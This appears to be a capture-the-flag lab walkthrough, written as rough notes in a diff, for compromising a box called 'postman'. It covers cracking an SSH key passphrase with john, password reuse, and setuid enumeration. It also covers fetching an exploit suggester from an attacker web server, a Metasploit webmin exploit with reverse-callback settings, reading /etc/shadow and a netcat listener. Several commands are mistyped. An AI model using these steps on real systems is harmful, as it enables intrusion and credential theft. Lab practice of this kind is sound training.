@@ -1,0 +1,215 @@
+/opt$ ls -al
+cat id rsa.bak
+    private key returned 
+    RSA PRIVATE KEY
+        copy the private key, try using it directly inthe event that it doesnt have a pass
+        this one does. Next we have to crack it.
+        tool for that is john
+locate ssh2john.py
+python /usr/share/john/ssh2john.py id_rsa.bak
+    output is a pth, pipe that to a file
+python [path] id_rsa.bak > hash.txt
+cat hash.txt
+        john is a tool to find common and other passwords; multiple pull versoins; standard with kali si a CPU version, there are GPU and expanded versions as well
+man john 
+locate rockyou.txt 
+    copy path 
+john hash.txt 
+    will try to figure out a password, hit space, see how many it's using what it's coming up with 
+john --wordlist=[path].txt hash.txt 
+        uses lots of cpu if you can use yoru video card for cracking it's exponentially faster 
+        wordlist is always faster. 
+    key is computer2008
+wc -l [path].txt
+ls
+        ( python /usr/share/john/sssh2john.py id_rsa.bak > hash.txt 
+        calls the application and creates that hash)
+chmod 600 id_rsa.bak
+ssh -i id_rsa.bak USR@10.10.10.160
+    input password 
+    set permissions to 600 in order to get the correct prompt for that password or ti will skip that and the private key will be ignored.
+    now cna type in passphrase for the key and if it's correct and matches the public key we can get in. 
+    return connection closed so it didnt' work investigate why 
+    can use wireshark:  
+        add -v to previous command
+ssh -i id_rsa.bak USR@10.10.10.160 -v 
+    follow TCP stream can see it gets encrypted in wireshark. can derive the fact that it did work, could negotiate an ecryption
+ssh -i id_rsa.bak USR@10.10.10.160 -vvh
+    what happened is it closed the port as waiting for the reply. 
+    look through ssh config, 
+grep USR *
+    return denyusers USR so you are now stuck, not a valid way to do localprivlege escalation.
+    try a new method to hack; 
+cd 
+sudo -l 
+    see what you CAN do 
+    cna't do anything here because need that password 
+su USR 
+    see if password reuse is happening. 
+    input password from before 
+    get in !
+cd 
+ls -al 
+    now in user acct 
+cat user.txt 
+get bash history 
+    see user's history 
+exit 
+cd 
+ls -al 
+cat .bash history 
+su USR 
+cd 
+ls -al 
+    back into user 
+    attainted user 
+cd .ssh 
+    copy my public key to the authorized keys 
+cat /root/.ssh/id_rsa.pub 
+    copy output 
+    make sure you stop tcp on wireshark 
+ssh USR@10.10.10.160
+    use the public key first 
+    blocked 
+    that's because of the deny we saw earlier 
+    secondary set for local privilege escalation 
+cat > authorized_keys 
+man find 
+find / -perm 6000 -print 2>/dev/null 
+    returns nothing 
+    try variations 
+find / -o 4000 2>/dev/null 
+    no return 
+    MEGA  and ENUM scripts to enumerate with Linux instead of type by hand is useful 
+    find files with setuid 
+find / -perm -1000 2>/dev/null
+ls -al user.txt 
+    output -rw-rw--- (means 4000, 2000, 1000)
+find / -perm -4000 -o -perm -2000 2>/dev/null 
+    returns paths 
+    start with the 4000 because that's set as root 
+find / -perm -400- 2>/dev/null 
+    output pretty standard items 
+uname -a 
+    check what server we are running for version because there could be a kernel exploit 
+    see if ubuntu kernel exploit here... 
+    linux exploit suggester on github 
+mkdir WEB
+cd WEB 
+wget [git link from exploit]
+python -m SimpleHTTPServer 8000
+    grab the interface port,setup of simple server to move data around 
+    set up a web server bc then can browse it.
+>>localhost:8000 can see it and pull it down!!! in browser 
+    dont want someone else to read everything in directory above that so made the new directory 
+>>10.10.15.24:8000
+    in browser to grab interface and you can see the whole directory is displayed so someone else could read anything in the machine 
+cd /data/new/postman/
+ls -al 
+    make sure nobody else got in (lol)
+cd WEB 
+uname -a 
+ls -al 
+    dont want to upll it down directly, pretend nobody knows there so put it secret 
+    dig into soem of other directories 
+du 
+    everyone looks in /temp very few in /var/temp 
+    dev/shm 
+ls -al /var/tmp 
+cd /dev/shm
+ls -al 
+cd .w 
+cd .. 
+ls -al 
+wget http://10.10.15.24:8000/linux-exploit-suggester.sh 
+    changen permissions 
+chmod 700 linux-exploit-suggester.sh 
+ntfs-3g-modprobe 
+ps -ef | grep chromium 
+    not running, so not a viable option 
+find / -perm -2000 2>/dev/null 
+    audit for customized files 
+    someone in history had looked at chrontab 
+ls -al /usr/bin/crontab 
+    usually set o group ID beacause everyone ca use it 
+crontab -l 
+    no crontab created 
+ls -al 
+crontab -e 
+    can create a new crontab to see what will happen 
+cat > script.sh 
+#!/bin/sh       
+    not ousing bash because it will ignore all setuid and setgroupid instructions so if you modify permissions 
+    chmod +4000 /bash will niot become root 
+cp /root/root.txt /dev/shm/.../root.txt 
+crontab -e 
+    nano'd in:
+            l * * * *  /dev/shm/.../script.sh 
+    save 
+chmod 755 *.sh 
+ls -al 
+    keep running this command to see when it's run to copy from root 
+ls -al 
+ls -al /var/mail 
+    if it fails it will email you 
+    but no facility here 
+cd 
+ls -al 
+ ./script.sh  
+    permission denied 
+d mesg | more 
+cd /var/log 
+    check error logs 
+syslog 
+    permission denied 
+wtemp /var/log 
+    who is logged in, who did log in, what terminal using 
+    use for log files recently update dto find error log 
+ls -ll -lrt 
+searchsploit webmin
+    basically a local search of exploitdb 
+msfconsole 
+    in another background terminal 
+        switch back
+    IP for webmin was 10000 
+vi /etc/hosts 
+    output has postman.htb so have ot make it: postman postman.htb 
+>>log into webin: webman:10000 in browser 
+    got in! 
+    check version 
+    view page source 
+        webmin 1.910
+    back in terminal that was one of the webmin outputs 
+search webmin 
+    see a packages update exploit 
+use [exploit path] 
+show option 
+set LHOST 10.10.10.160
+set LPORT 1000
+set LHOST postman 
+show payloads 
+show options 
+set PASSWORD computer2008
+set USERNAME USR
+set SSL true 
+show advanced
+    see if way to accept all ssl certs 
+show options 
+    pass, port true, USR postman, 10000
+set RHOSTS postman 
+set LHOST 10.10.15.24 
+set LPORT 31415 
+    open on firewall so cna use 
+show options 
+run 
+whoami
+id 
+pwd 
+cat /etc/shadow 
+    read the shadow file means you are full on root! 
+nc -lvp 9999
+    netcat listener on 9000
+    
+
+
+##trying to get a root shell next step....
